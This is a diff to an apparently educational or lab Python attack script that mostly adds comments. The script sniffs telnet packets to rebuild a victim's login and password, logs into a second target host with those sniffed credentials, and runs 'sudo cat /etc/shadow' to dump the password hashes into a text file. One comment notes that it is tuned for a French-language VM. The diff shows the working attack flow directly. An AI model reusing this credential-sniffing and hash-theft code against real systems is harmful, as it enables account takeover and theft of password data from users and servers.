@@ -8,7 +8,7 @@ user_password = []
 counter = 0
 target2_ip = ""
 
-
+# Analyse the payload of each packet to reform the initial login and password values
 def get_telnet_credentials(pkt):
     global counter
     global user_login
@@ -43,7 +43,8 @@ def get_telnet_credentials(pkt):
     else:
         return
 
-
+# print the value of the login and password, then initialise a telnet connection with the server using the sniffed credentials
+# tries to read the content of the shadow file and paste its content in a .txt file
 def use_telnet_credentials(login, password):
     global target2_ip
 
@@ -65,6 +66,7 @@ def use_telnet_credentials(login, password):
         tn.read_until(b"Password: ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
         tn.write(b"sudo cat /etc/shadow\n")
+        # Following line would need to be changed depending of the language configuration of the server machine: actually set for a french VM 
         tn.read_until(b"[sudo] Mot de passe de " + str_login.encode('ascii') + b" : ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
         tn.write(b"exit\n")
@@ -78,7 +80,7 @@ def use_telnet_credentials(login, password):
         print("an error occured: " + str(e))
         sys.exit(1)
 
-
+# asks for the client and server IP before initialising sniffing of telnet packets
 def run():
     global target2_ip
     interface = "eth0"
